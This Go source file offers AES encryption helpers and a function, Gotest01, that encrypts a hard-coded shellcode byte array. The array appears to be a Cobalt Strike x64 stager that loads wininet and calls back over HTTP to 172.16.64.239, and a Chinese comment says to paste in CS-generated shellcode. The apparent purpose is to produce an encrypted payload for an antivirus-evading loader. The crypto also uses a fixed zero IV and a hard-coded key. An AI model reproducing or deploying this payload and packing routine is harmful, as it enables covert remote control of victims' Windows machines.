package utils

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"log"
)

const (
	StdLen  = 16
	UUIDLen = 20
	iv      = "0000000000000000"
)

var StdChars = []byte("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789")

// NewLenChars returns a new random string of the provided length, consisting of the provided byte slice of allowed characters(maximum 256).
func NewLenChars(length int, chars []byte) []byte {
	if length == 0 {
		_ = 1
	}
	clen := len(chars)
	if clen < 2 || clen > 256 {
		panic("Wrong charset length for NewLenChars()")
	}
	maxrb := 255 - (256 % clen)
	b := make([]byte, length)
	r := make([]byte, length+(length/4)) // storage for random bytes.
	i := 0
	for {
		if _, err := rand.Read(r); err != nil {
			panic("Error reading random bytes: " + err.Error())
		}
		for _, rb := range r {
			c := int(rb)
			if c > maxrb {
				continue // Skip this number to avoid modulo bias.
			}
			b[i] = chars[c%clen]
			i++
			if i == length {
				return b
			}
		}
	}
}

func PKCS5Padding(ciphertext []byte, blockSize int) []byte {
	padding := blockSize - len(ciphertext)%blockSize
	padtext := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(ciphertext, padtext...)
}

func PKCS5UnPadding(origData []byte) []byte {
	length := len(origData)
	unpadding := int(origData[length-1])
	return origData[:(length - unpadding)]
}
func AesDecrypt(decodeStr string, key []byte) ([]byte, error) {
	decodeBytes, err := base64.StdEncoding.DecodeString(decodeStr)
	if err != nil {
		return nil, err
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	blockMode := cipher.NewCBCDecrypter(block, []byte(iv))
	origData := make([]byte, len(decodeBytes))

	blockMode.CryptBlocks(origData, decodeBytes)
	origData = PKCS5UnPadding(origData)
	return origData, nil
}

func AesEncrypt(encodeBytes []byte, key []byte) (string, error) {

	block, err := aes.NewCipher(key)
	if err != nil {
		log.Println(err)
		return "", err
	}

	blockSize := block.BlockSize()
	fmt.Println(blockSize)
	encodeBytes = PKCS5Padding(encodeBytes, blockSize)

	blockMode := cipher.NewCBCEncrypter(block, []byte(iv))
	crypted := make([]byte, len(encodeBytes))
	blockMode.CryptBlocks(crypted, encodeBytes)

	return base64.StdEncoding.EncodeToString(crypted), nil
}

func Gotest01() {
	var payload = []byte{0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc8, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x75, 0x72, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x4f, 0xff, 0xff, 0xff, 0x5d, 0x6a, 0x00, 0x49, 0xbe, 0x77, 0x69, 0x6e, 0x69, 0x6e, 0x65, 0x74, 0x00, 0x41, 0x56, 0x49, 0x89, 0xe6, 0x4c, 0x89, 0xf1, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0x48, 0x31, 0xd2, 0x4d, 0x31, 0xc0, 0x4d, 0x31, 0xc9, 0x41, 0x50, 0x41, 0x50, 0x41, 0xba, 0x3a, 0x56, 0x79, 0xa7, 0xff, 0xd5, 0xe9, 0x93, 0x00, 0x00, 0x00, 0x5a, 0x48, 0x89, 0xc1, 0x41, 0xb8, 0xdf, 0x7d, 0x00, 0x00, 0x4d, 0x31, 0xc9, 0x41, 0x51, 0x41, 0x51, 0x6a, 0x03, 0x41, 0x51, 0x41, 0xba, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0xeb, 0x79, 0x5b, 0x48, 0x89, 0xc1, 0x48, 0x31, 0xd2, 0x49, 0x89, 0xd8, 0x4d, 0x31, 0xc9, 0x52, 0x68, 0x00, 0x32, 0xc0, 0x84, 0x52, 0x52, 0x41, 0xba, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x48, 0x89, 0xc6, 0x48, 0x83, 0xc3, 0x50, 0x6a, 0x0a, 0x5f, 0x48, 0x89, 0xf1, 0xba, 0x1f, 0x00, 0x00, 0x00, 0x6a, 0x00, 0x68, 0x80, 0x33, 0x00, 0x00, 0x49, 0x89, 0xe0, 0x41, 0xb9, 0x04, 0x00, 0x00, 0x00, 0x41, 0xba, 0x75, 0x46, 0x9e, 0x86, 0xff, 0xd5, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x49, 0xc7, 0xc0, 0xff, 0xff, 0xff, 0xff, 0x4d, 0x31, 0xc9, 0x52, 0x52, 0x41, 0xba, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x0f, 0x85, 0x9d, 0x01, 0x00, 0x00, 0x48, 0xff, 0xcf, 0x0f, 0x84, 0x8c, 0x01, 0x00, 0x00, 0xeb, 0xb3, 0xe9, 0xe4, 0x01, 0x00, 0x00, 0xe8, 0x82, 0xff, 0xff, 0xff, 0x2f, 0x66, 0x47, 0x39, 0x77, 0x00, 0xc4, 0x81, 0x4a, 0x47, 0x53, 0xa6, 0x9b, 0x11, 0x26, 0x5b, 0xb8, 0xc8, 0xa9, 0x3c, 0xd6, 0x0e, 0xf1, 0x4f, 0xc4, 0x62, 0x13, 0x7b, 0xd7, 0x79, 0x3a, 0xd1, 0x02, 0xd0, 0xec, 0xfa, 0x66, 0x4a, 0x7b, 0xbf, 0x51, 0x05, 0x7e, 0xf7, 0x3e, 0xca, 0x58, 0x35, 0x16, 0xeb, 0x48, 0x92, 0x62, 0x9f, 0x95, 0x57, 0x0b, 0xec, 0xa2, 0x8d, 0xe9, 0x53, 0xc5, 0xa8, 0x5f, 0xe4, 0x3a, 0x67, 0x50, 0x60, 0x80, 0xbf, 0x27, 0x38, 0x6c, 0xa2, 0xec, 0x21, 0xca, 0x00, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x63, 0x6f, 0x6d, 0x70, 0x61, 0x74, 0x69, 0x62, 0x6c, 0x65, 0x3b, 0x20, 0x4d, 0x53, 0x49, 0x45, 0x20, 0x37, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x35, 0x2e, 0x31, 0x3b, 0x20, 0x54, 0x72, 0x69, 0x64, 0x65, 0x6e, 0x74, 0x2f, 0x35, 0x2e, 0x30, 0x29, 0x0d, 0x0a, 0x00, 0x99, 0xd2, 0xc4, 0x75, 0xec, 0x14, 0x7e, 0xba, 0x82, 0xdf, 0x40, 0x5c, 0x7e, 0x4c, 0x67, 0x55, 0xef, 0x3e, 0x13, 0x02, 0x6b, 0xd7, 0xfd, 0x08, 0xf7, 0xe0, 0x8c, 0xcb, 0x24, 0x70, 0x25, 0x45, 0x96, 0x52, 0x7c, 0x98, 0x42, 0x4b, 0x80, 0x7c, 0x02, 0x80, 0xe0, 0xea, 0xaf, 0x65, 0x30, 0xa6, 0x34, 0xa9, 0x39, 0x0d, 0x3b, 0xbf, 0xf0, 0x46, 0x79, 0x4d, 0x83, 0xfb, 0xdd, 0x12, 0xf5, 0xef, 0xf4, 0x88, 0xfd, 0x87, 0xc9, 0x39, 0xf9, 0x4f, 0xfb, 0xb4, 0x61, 0x0d, 0xd0, 0x83, 0xf2, 0x01, 0x6a, 0x93, 0x34, 0xd9, 0xbe, 0x4d, 0xdb, 0x53, 0xf3, 0x43, 0xa6, 0x8d, 0x0b, 0x6c, 0x21, 0xe2, 0x66, 0xc7, 0xcf, 0x04, 0x24, 0x70, 0xa5, 0x96, 0xfe, 0xb7, 0xe0, 0x53, 0x16, 0x5b, 0x94, 0xdd, 0x2d, 0x31, 0xf7, 0xa6, 0x6c, 0xb6, 0x1d, 0xe4, 0x1e, 0x2d, 0x75, 0x2a, 0x1e, 0x20, 0x77, 0xec, 0xe1, 0x0b, 0x3f, 0x3e, 0x97, 0xdf, 0x8d, 0x91, 0x31, 0xcd, 0xb9, 0x22, 0x2b, 0xf1, 0x53, 0x14, 0xd0, 0x65, 0x50, 0xa7, 0x4e, 0x87, 0x85, 0x78, 0xd3, 0x94, 0xa0, 0xcf, 0x89, 0x0d, 0x1b, 0xd9, 0xc8, 0x47, 0xad, 0x0d, 0x4f, 0x00, 0x79, 0x6a, 0x08, 0xc5, 0xa3, 0x93, 0xcc, 0x90, 0x9d, 0xba, 0xd2, 0x3e, 0x8e, 0x79, 0xd8, 0x74, 0x1b, 0xbc, 0x5e, 0x72, 0x95, 0xd4, 0x34, 0x1a, 0x28, 0x89, 0x3f, 0xe3, 0xb9, 0x6f, 0xd5, 0x1b, 0x8f, 0x42, 0xc8, 0x65, 0xba, 0xee, 0x2a, 0xa3, 0xa2, 0x50, 0x21, 0x39, 0xbe, 0x84, 0x92, 0xd9, 0x21, 0x08, 0x2d, 0x0f, 0x9e, 0x24, 0x59, 0xee, 0xc1, 0x75, 0xe8, 0x00, 0x41, 0xbe, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0xba, 0x00, 0x00, 0x40, 0x00, 0x41, 0xb8, 0x00, 0x10, 0x00, 0x00, 0x41, 0xb9, 0x40, 0x00, 0x00, 0x00, 0x41, 0xba, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x48, 0x93, 0x53, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x41, 0xb8, 0x00, 0x20, 0x00, 0x00, 0x49, 0x89, 0xf9, 0x41, 0xba, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x20, 0x85, 0xc0, 0x74, 0xb6, 0x66, 0x8b, 0x07, 0x48, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xd7, 0x58, 0x58, 0x58, 0x48, 0x05, 0x00, 0x00, 0x00, 0x00, 0x50, 0xc3, 0xe8, 0x7f, 0xfd, 0xff, 0xff, 0x31, 0x37, 0x32, 0x2e, 0x31, 0x36, 0x2e, 0x36, 0x34, 0x2e, 0x32, 0x33, 0x39, 0x00, 0x51, 0x09, 0xbf, 0x6d}
	// 这里放CS 生成的shellcode(C语言) 修改为形如: 0xfc,0x00的格式
	key := "woshikeywoshikey"
	b, _ := AesEncrypt(payload, []byte(key))
	log.Println("enc_info: " + string(b))
}
